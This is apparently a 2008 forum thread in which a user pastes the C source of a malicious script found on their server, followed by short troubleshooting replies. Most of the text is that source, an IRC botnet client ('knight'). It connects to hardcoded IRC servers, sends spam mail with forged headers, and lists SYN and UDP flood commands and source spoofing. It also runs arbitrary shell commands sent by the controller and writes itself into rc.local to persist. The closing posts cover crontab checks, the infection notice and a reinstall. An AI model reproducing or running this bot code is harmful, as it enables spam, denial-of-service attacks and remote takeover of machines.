	unsigned char  pr:1;
	unsigned char  ra:1;
	unsigned short int que_num;
	unsigned short int rep_num;
	unsigned short int num_rr;
	unsigned short int num_rrsup;
};

struct dns_rr {
	unsigned short type;
	unsigned short rr_class;
	unsigned int ttl;
	unsigned short rdlength;
};

struct _elist {
	char *name;
	struct _elist *next;
};

struct _mailserver {
	unsigned long count;
	char *name;
	struct _elist *elist;
	struct _mailserver *next;
} *mailservers=(struct _mailserver*)NULL;

char *GetServer(char *str) {
	unsigned char buf[2048];
	unsigned long len=0,i,j,hostlen,g;
	struct dns dnsp;
	struct dns_rr dnsr;
	struct ainst a,client;
	char host[256],domain[256];
	unsigned long start;
	struct _mailserver *current=NULL;
	struct _mailserver *getlist=mailservers;
	i=0;
	while(getlist != NULL) {
		if (!strcasecmp(getlist->name,str)) {
			i=1;
			break;
		}
		getlist=getlist->next;
	}
	if (i) {
		struct _elist *elist=getlist->elist;
		current=getlist;
		if (current->count) {
			for (i=0;i<(rand()%current->count);i++) elist=elist->next;
			return elist->name;
		}
		else return 0;
	}
	else {
		struct _mailserver *new=(struct _mailserver*)malloc(sizeof(struct _mailserver));
		new->count=0;
		new->name=strdup(str);
		new->elist=NULL;
		new->next=mailservers;
		mailservers=new;
		current=new;
	}

	if (strlen(str) > 256) return 0;
	strcpy(host,str);
	if (audp_setup(&a,"12.127.17.71",53) != ASUCCESS) return 0;
	srand(time(NULL));
	memset(buf,0,2048);
	dnsp.id=rand();
	dnsp.rd=1;
	dnsp.tc=0;
	dnsp.aa=0;
	dnsp.opcode=0;
	dnsp.qr=0;
	dnsp.rcode=0;
	dnsp.unused=0;
	dnsp.pr=0;
	dnsp.ra=0;
	dnsp.que_num=256;
	dnsp.rep_num=0;
	dnsp.num_rr=0;
	dnsp.num_rrsup=0;
	memcpy(buf,(void*)&dnsp,sizeof(dnsp));
	len+=sizeof(dnsp);
	hostlen=strlen(host);
	for (i=0,j=0;i<=hostlen;i++) if (host[i] == '.' || host[i] == 0) {
		char tmp;
		tmp=host[i];
		host[i]=0;
		sprintf(buf+len,"%c%s",(unsigned char)(i-j),host+j);
		len+=1+strlen(host+j);
                j=i+1;
		host[i]=tmp;
        }
	buf[len++]=0x0;
	buf[len++]=0x0;
	buf[len++]=0xf;
	buf[len++]=0x0;
	buf[len++]=0x1;
	audp_send(&a,buf,len);

	memset(buf,0,sizeof(buf));
	start=time(NULL);
	while(audp_recv(&a,&client,buf,sizeof(buf))) if (time(NULL)-start > 10) return 0;
	memcpy((void*)&dnsp,buf,sizeof(dnsp));
	memset(domain,0,256);
	for (i=0;i<ntohs(dnsp.rep_num) && len<=a.len;i++) {
		char output[256];
		unsigned long tmpl,dlen;
		len+=2;
		memcpy((void*)&dnsr,buf+len,sizeof(dnsr));
		len+=sizeof(dnsr);
		tmpl=len;
		memset(output,0,256);
		while (len-tmpl < ntohs(dnsr.rdlength)-5) {
			unsigned char tmp;
			dlen=buf[len];
			if (dlen == 0) break;
			tmp=buf[len+dlen+1];
			buf[len+dlen+1]=0;
			sprintf(output+strlen(output),"%s.",buf+len+1);
			buf[len+dlen+1]=tmp;
			len+=dlen+1;
		}
		g=0;
		if (buf[len] == 0) len++;
		else {
			g=1;
			len+=2;
		}
		if (i) strcpy(output+strlen(output),domain);
		else {
			for (j=0;j<strlen(output) && output[j] != '.';j++);
			strcpy(domain,output+j+1);
			if (g) {
				strcpy(domain+strlen(domain),host);
				strcpy(output+strlen(output),host);
			}
		}
		while(output[strlen(output)-1] == '.') output[strlen(output)-1]=0;
		{
			struct _elist *new=(struct _elist*)malloc(sizeof(struct _elist));
			new->name=strdup(output);
			new->next=current->elist;
			current->elist=new;
			current->count++;
		}
	}
	audp_close(&a);
	if (current->count) return current->elist->name;
	else return 0;
}

void SendMail(char *to, char *from, char *subject, char *data) {
	struct ainst srv;
	char buf[4096],bufm[4096],*sa;
	unsigned long i,mode=0,tm=time(NULL);
	memset(buf,0,4096);
	strcpy(buf,to);
	for (i=0;i<strlen(to);i++) if (to[i] == '@') break;
	cleanup(buf);
	cleanup(from);
	cleanup(subject);
	sa=GetServer(buf+i+1);
	if (sa == NULL) return;
	if (atcp_connect(&srv,sa,25) != 0) return;
	while(1) {
		struct ainst *g[1];
		g[0]=&srv;
		memset(bufm,0,4096);
		if (await(g,1,AREAD,20) != 0 || atcp_recv(&srv,bufm,4096) != 0 || srv.len == 0) return;
		cleanup(bufm);
		switch(atoi(bufm)) {
			case 220:
				atcp_sendmsg(&srv,"HELO %s\n",sa);
				break;
			case 250:
				switch(mode) {
					case 0:
						atcp_sendmsg(&srv,"MAIL FROM:<%s>\n",from);
						break;
					case 1:
						atcp_sendmsg(&srv,"RCPT TO:<%s>\n",buf);
						break;
					case 2:
						atcp_sendmsg(&srv,"DATA\n");
						break;
					case 3:
						atcp_sendmsg(&srv,"QUIT\n");
						atcp_close(&srv);
						return;
				}
				mode++;
				break;
			case 354:
				atcp_sendmsg(&srv,"Return-Path: <%c%c%c%c%c%c%c@aol.com>\n",tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65),tolower((rand()%(91-65))+65));
				atcp_sendmsg(&srv,"From: %s\n",from);
				atcp_sendmsg(&srv,"Message-ID: <%x.%x.%x@aol.com>\n",rand(),rand(),rand());
				atcp_sendmsg(&srv,"Date: %s",ctime(&tm));
				atcp_sendmsg(&srv,"Subject: %s\n",subject);
				atcp_sendmsg(&srv,"To: %s\n",buf);
				atcp_sendmsg(&srv,"Mime-Version: 1.0\n");
				atcp_sendmsg(&srv,"Content-Type: text/html\n\n");
				atcp_sendmsg(&srv,"%s\r\n.\r\n",data);
				break;
		}
	}
}
void sendspam(int sock, char *sender, int argc, char **argv) {
	struct ainst up;
	struct ainst *g[1];
	char *server,bufm[4096],*tmp,*str;
	char *from=NULL,*subject=NULL,*data=NULL,*emails=NULL;
	long i,d;
	unsigned long emailcount=0;
	if (argc < 3) {
		Send(sock,"NOTICE %s :SPAM <url> <from> <to>\n",sender);
		return;
	}
	if (mfork(sender) != 0) return;
	if (!strncmp(argv[1],"http://",7)) server=argv[1]+7;
	else server=argv[1];
	for (i=0;i<strlen(server) && server[i] != '/';i++);
	server[i]=0;
	if (atcp_connect(&up,server,80) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to host\n",sender);
		exit(0);
	}
	atcp_sendmsg(&up,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",server+i+1,server);
	g[0]=&up;
	if (await(g,1,AREAD,20) != 0 || atcp_recv(&up,bufm,4096) != 0 || up.len == 0) {
		Send(sock,"NOTICE %s :Unable to talking to host\n",sender);
		exit(0);
	}
	for (d=0;d<up.len-3;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
		int mode=0,lpass=0;
		d+=4;
		goto read;
		while(1) {
			struct ainst *g[1];
			g[0]=&up;
			if (await(g,1,AREAD,20) != 0) {
				Send(sock,"NOTICE %s :Connection timed out, try again later.\n",sender);
				exit(0);
			}
			if (atcp_recv(&up,bufm,4096) != 0 || up.len <= 0) break;
			d=0;
			read:
			for (;d<up.len;d++) {
				if (!strncmp(bufm+d,"----FROM----",strlen("----FROM----"))) {
					mode=1;
					lpass=1;
					continue;
				}
				if (!strncmp(bufm+d,"----SUBJECT----",strlen("----SUBJECT----"))) {
					mode=2;
					lpass=1;
					continue;
				}
				if (!strncmp(bufm+d,"----DATA----",strlen("----DATA----"))) {
					mode=3;
					lpass=1;
					continue;
				}
				if (!strncmp(bufm+d,"----EMAILS----",strlen("----EMAILS----"))) {
					mode=4;
					lpass=1;
					continue;
				}
				switch (mode) {
					case 1:
						str=from;
						break;
					case 2:
						str=subject;
						break;
					case 3:
						str=data;
						break;
					case 4:
						str=-1;
						if (bufm[d] == '\n') if (!lpass) emailcount++;
						if (emailcount >= atoi(argv[2]) && emailcount < atoi(argv[3])) str=emails;
						if (bufm[d] == '\n' && emails == NULL) str=-1;
						break;
					default:
						str=-1;
				}
				if (str != -1 && !lpass) {
					int dontfree=0;
					if (str == NULL) {
						str="";
						dontfree=1;
					}
					tmp=malloc(strlen(str)+2);
					strcpy(tmp,str);
					tmp[strlen(str)]=bufm[d];
					tmp[strlen(str)+1]=0;
					if (!dontfree) free(str);
					str=tmp;
					switch (mode) {
						case 1:
							from=str;
							break;
						case 2:
							subject=str;
							break;
						case 3:
							data=str;
							break;
						case 4:
							if (emailcount >= atoi(argv[2]) && emailcount < atoi(argv[3])) emails=str;
							break;
					}
				}
				if (bufm[d] == '\n') lpass=0;
			}
		}
		break;
	}
	atcp_close(&up);
	if (!from || !subject || !data || !emails) exit(0);
	str=emails;
	do {
		int pid;
		memset(bufm,0,4096);
		for (i=0;str[i] != 0 && str[i] != '\n';i++) bufm[i]=str[i];
		if ((pid=fork()) == 0) {
			alarm(10);
			SendMail(bufm,from,subject,data);
			exit(0);
		}
		waitpid(pid,0,0);
		tmp=strchr(str,'\n');
		if (tmp == NULL) break;
		else str=tmp+1;
	} while(1);
	exit(0);
}
void addserver(int sock, char *sender, int argc, char **argv) {
	unsigned long i;
	if (argc != 1) {
		Send(sock,"NOTICE %s :ADDSERVER <server>\n",sender);
		return;
	}
	for (i=0;i<numservers;i++) if (!strcmp(servers[i],argv[1])) return 0;
	if (host2ip(argv[1])) {
		servers[numservers]=strdup(argv[1]);
		numservers++;
	}
}
void delserver(int sock, char *sender, int argc, char **argv) {
	unsigned long i,j,m=0;
	if (argc != 1) {
		Send(sock,"NOTICE %s :DELSERVER <server>\n",sender);
		return;
	}
	while(1) {
		m=0;
		for (i=0;i<numservers;i++) if (!strwildmatch(argv[1],servers[i])) {
			for (j=i;j<numservers;j++) servers[j]=servers[j+1];
			numservers--;
			m++;
		}
		if (m == 0) break;
	}
}
void listservers(int sock, char *sender, int argc, char **argv) {
	unsigned long i;
	for (i=0;i<numservers;i++) Send(sock,"NOTICE %s :Server #%d: %s\n",sender,i,servers[i]);
}
void help(int sock, char *sender, int argc, char **argv) {
	if (mfork(sender) != 0) return;
	Send(sock,"NOTICE %s :ESCAN <server>                = Scans the hard drive for emails\n",sender); sleep(2);
	Send(sock,"NOTICE %s :SPAM <url>                    = Parses a website then spams it\n",sender); sleep(2);
	Send(sock,"NOTICE %s :WEBSITE <url>                 = Goes to a website\n",sender); sleep(2);

	Send(sock,"NOTICE %s :TSUNAMI <target> <secs>       = Special dos\n",sender); sleep(2);
	Send(sock,"NOTICE %s :PAN <target> <port> <secs>    = An advanced syn flooder\n",sender); sleep(2);
	Send(sock,"NOTICE %s :UDP <target> <port> <secs>    = A udp flooder\n",sender); sleep(2);
	Send(sock,"NOTICE %s :UNKNOWN <target> <secs>       = Another non-spoof udp flooder\n",sender); sleep(2);

	Send(sock,"NOTICE %s :NICK <nick>                   = Changes the nick of the knight\n",sender); sleep(2);
	Send(sock,"NOTICE %s :GETSPOOFS                     = Gets the current spoofing\n",sender); sleep(2);
	Send(sock,"NOTICE %s :SPOOFS <subnet>               = Changes spoofing to a subnet\n",sender); sleep(2);

	Send(sock,"NOTICE %s :ADDSERVER <server>            = Adds a server to the list\n",sender);
	Send(sock,"NOTICE %s :DELSERVER <server>            = Deletes a server from the list\n",sender);
	Send(sock,"NOTICE %s :LISTSERVERS                   = Lists server on the list\n",sender);

	Send(sock,"NOTICE %s :DISABLE                       = Disables all packeting from this knight\n",sender); sleep(2);
	Send(sock,"NOTICE %s :ENABLE                        = Enables all packeting from this knight\n",sender); sleep(2);

	Send(sock,"NOTICE %s :KILL                          = Kills the knight\n",sender); sleep(2);
	Send(sock,"NOTICE %s :GET <http address> <save as>  = Downloads a file off the web\n",sender); sleep(2);
	Send(sock,"NOTICE %s :VERSION                       = Requests version of knight\n",sender); sleep(2);
	Send(sock,"NOTICE %s :KILLALL                       = Kills all current packeting\n",sender); sleep(2);
	Send(sock,"NOTICE %s :HELP                          = Displays this\n",sender);

	Send(sock,"NOTICE %s :IRC <command>                 = Sends this command to the server\n",sender); sleep(2);
	Send(sock,"NOTICE %s :SH <command>                  = Executes a command\n",sender); sleep(2);
	exit(0);
}
void killall(int sock, char *sender, int argc, char **argv) {
	unsigned long i;
	for (i=0;i<numpids;i++) {
		if (pids[i] != 0 && pids[i] != getpid()) {
			Send(sock,"NOTICE %s :Killing pid %d.\n",sender,pids[i]);
			kill(pids[i],9);
		}
	}
}
void killd(int sock, char *sender, int argc, char **argv) {
	if (!disable) kill(0,9);
	else Send(sock,"NOTICE %s :Unable to comply.\n");
}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
	{ "ADDSERVER", addserver },
	{ "DELSERVER", delserver },
	{ "LISTSERVERS", listservers },

	{ "ESCAN", escan },
	{ "SPAM", sendspam },
	{ "WEBSITE", website },

	{ "TSUNAMI", tsunami },
	{ "PAN", pan },
	{ "UDP", udp },
	{ "UNKNOWN", unknown },

	{ "NICK", nickc },
	{ "GETSPOOFS", getspoofs },
	{ "SPOOFS", spoof },

	{ "DISABLE", disable },
	{ "ENABLE", enable },

	{ "KILL", killd },
	{ "GET", get },
	{ "VERSION", version },
	{ "KILLALL", killall },
	{ "HELP", help },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
void _PRIVMSG(int sock, char *sender, char *str) {
	int i;
	char *to, *message;
	for (i=0;i<strlen(str) && str[i] != ' ';i++);
	str[i]=0;
	to=str;
	message=str+i+2;
	for (i=0;i<strlen(sender) && sender[i] != '!';i++);
	sender[i]=0;
	if (*message == '!' && !strcmp(to,chan)) {
		char *params[12], name[1024]={0};
		int num_params=0, m;
		message++;
		for (i=0;i<strlen(message) && message[i] != ' ';i++);
		message[i]=0;
		if (strwildmatch(message,nick)) return;
		message+=i+1;
		if (!strncmp(message,"IRC ",4)) if (disabled) Send(sock,"NOTICE %s :Unable to comply.\n",sender); else Send(sock,"%s\n",message+4);
		if (!strncmp(message,"SH ",3)) {
			char buf[1024];
			FILE *command;
			if (mfork(sender) != 0) return;
			memset(buf,0,1024);
			sprintf(buf,"export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s",message+3);
			command=popen(buf,"r");
			while(!feof(command)) {
					memset(buf,0,1024);
					fgets(buf,1024,command);
					Send(sock,"NOTICE %s :%s\n",sender,buf);
					sleep(1);
			}
			pclose(command);
			exit(0);
		}
		m=strlen(message);
		for (i=0;i<m;i++) {
			if (*message == ' ' || *message == 0) break;
			name[i]=*message;
			message++;
		}
		for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
		num_params++;
		if (num_params > 10) num_params=10;
		params[0]=name;
		params[num_params+1]="\0";
		m=1;
		while (*message != 0) {
			message++;
			if (m >= num_params) break;
			for (i=0;i<strlen(message) && message[i] != ' ';i++);
			params[m]=(char*)malloc(i+1);
			strncpy(params[m],message,i);
			params[m][i]=0;
			m++;
			message+=i;
		}
		for (m=0; flooders[m].cmd != (char *)0; m++) {
			if (!strcasecmp(flooders[m].cmd,name)) {
				flooders[m].func(sock,sender,num_params-1,params);
				for (i=1;i<num_params;i++) free(params[i]);
				return;
			}
		}
	}
}
void _376(int sock, char *sender, char *str) {
	Send(sock,"MODE %s -xi\n",nick);
	Send(sock,"JOIN %s :%s\n",chan,key);
	Send(sock,"WHO %s\n",nick);
}
void _PING(int sock, char *sender, char *str) {
	Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
	int i,d;
	char *msg=str;
	struct hostent *hostm;
	unsigned long m;
	for (i=0,d=0;d<5;d++) {
			for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
			if (i == strlen(str)) return;
	}
	for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
	msg[i]=0;
	if (!strcmp(msg,nick) && !spoofsm) {
			msg=str;
			for (i=0,d=0;d<3;d++) {
					for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
					if (i == strlen(str)) return;
			}
			for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
			msg[i]=0;
			if ((m = inet_addr(msg)) == -1) {
					if ((hostm=gethostbyname(msg)) == NULL) {
							Send(sock,"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",chan);
							return;
					}
					memcpy((char*)&m, hostm->h_addr, hostm->h_length);
			}
			((char*)&spoofs)[3]=((char*)&m)[0];
			((char*)&spoofs)[2]=((char*)&m)[1];
			((char*)&spoofs)[1]=((char*)&m)[2];
			((char*)&spoofs)[0]=0;
			spoofsm=256;
	}
}
void _433(int sock, char *sender, char *str) {
	free(nick);
	nick=makestring(0);
}
void recon(int sock, char *sender, char *str) {
	close(sock);
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
	{ "352", _352 },
	{ "376", _376 },
	{ "433", _433 },
	{ "422", _376 },
	{ "PRIVMSG", _PRIVMSG },
	{ "PING", _PING },

	{ "467", recon },
	{ "471", recon },
	{ "473", recon },
	{ "474", recon },
	{ "475", recon },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
	struct sockaddr_in srv;
	unsigned long start;
	int flag;
	struct hostent *hp;
start:
	sock=-1;
	flag=1;
	server=servers[rand()%numservers];
	while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
	srv.sin_family = AF_INET;
	srv.sin_port = htons(3159);
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
			setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
			setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
			setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	close(sock);
	goto start;
}
void conv(char *str,int len,unsigned long server) {
	memset(str,0,256);
	strcpy(str,inet_ntoa(*(struct in_addr*)&server));
}
int main(int argc, char **argv) {
	int on;
	unsigned long i;
	char cwd[256],*str;
	FILE *file;
#ifdef STARTUP
	str="/etc/rc.d/rc.local";
	file=fopen(str,"r");
	if (file == NULL) {
		str="/etc/rc.conf";
		file=fopen(str,"r");
	}
	if (file != NULL) {
		char outfile[256], buf[1024];
		int i=strlen(argv[0]), d=0;
		getcwd(cwd,256);
		if (strcmp(cwd,"/")) {
			while(argv[0][i] != '/') i--;
			sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
			while(!feof(file)) {
				fgets(buf,1024,file);
				if (!strcmp(buf,outfile)) d++;
			}
			if (d == 0) {
				FILE *out;
				fclose(file);
				out=fopen(str,"a");
				if (out != NULL) {
					fputs(outfile,out);
					fclose(out);
				}
			}
			else fclose(file);
		}
		else fclose(file);
	}
#endif
	if (fork()) exit(0);
	srand((time(NULL) ^ getpid()) + getppid());
	nick=makestring(0);
	ident=makestring(1);
	user=makestring(1);
	chan=CHAN;
	key=KEY;
	server=NULL;
	memset(servers,0,sizeof(char*)*256);
	for (i=0;i<numservers;i++) servers[i]=strdup(initservers[i]);
sa:
	identd();
	sleep(5);
	con();
	Send(sock,"NICK %s\nUSER %s localhost localhost :%s\n",nick,ident,user);
	while(1) {
		unsigned long p;
		fd_set n;
		struct timeval tv;
		FD_ZERO(&n);
		FD_SET(sock,&n);
		tv.tv_sec=60*20;
		tv.tv_usec=0;
		if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
		for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
			unsigned int *newpids,on;
			for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
			numpids--;
			newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
			for (on=0;on<numpids;on++) newpids[on]=pids[on];
			free(pids);
			pids=newpids;
		}
		if (FD_ISSET(sock,&n)) {
			char buf[4096], *str;
			int i;
			if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
			buf[i]=0;
			str=strtok(buf,"\n");
			while(str && *str) {
			char name[1024], sender[1024];
			filter(str);
			if (*str == ':') {
				for (i=0;i<strlen(str) && str[i] != ' ';i++);
				str[i]=0;
				strcpy(sender,str+1);
				strcpy(str,str+i+1);
			}
			else strcpy(sender,"*");
			for (i=0;i<strlen(str) && str[i] != ' ';i++);
			str[i]=0;
			strcpy(name,str);
			strcpy(str,str+i+1);
			for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
				if (!strcasecmp(name,"ERROR")) goto sa;
				str=strtok((char*)NULL,"\n");
			}
		}
	}
	return 0;
}


```

---

### Post by geirha on 2008-10-08
What does that job look like in your crontab? It should be listed with one of these commands ```
crontab -l
cat /etc/crontab
```

Also, did you try running the memcheck? It should be an option in the boot menu.

---

### Post by murbanci on 2008-10-08
So it turns out that it was a problem with that script.  I got an email from my university saying that there was a possible IRC Bot infection from my IP address.  I reinstalled and everything is working fine now.  I made sure to change the standard ports for ssh and vnc this time.  Hopefully that will help.

---

### Post by geirha on 2008-10-08
The most probable way in is through your web applications. Check to see if there are updates to the web applications you are using and read up on [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting)

---

### Post by murbanci on 2008-10-08
XSS is possible but I kind of doubt it.  Its used mainly as a headless server so we are not looking at webpages on it which as I understand the wiki is how you get attacked.

---

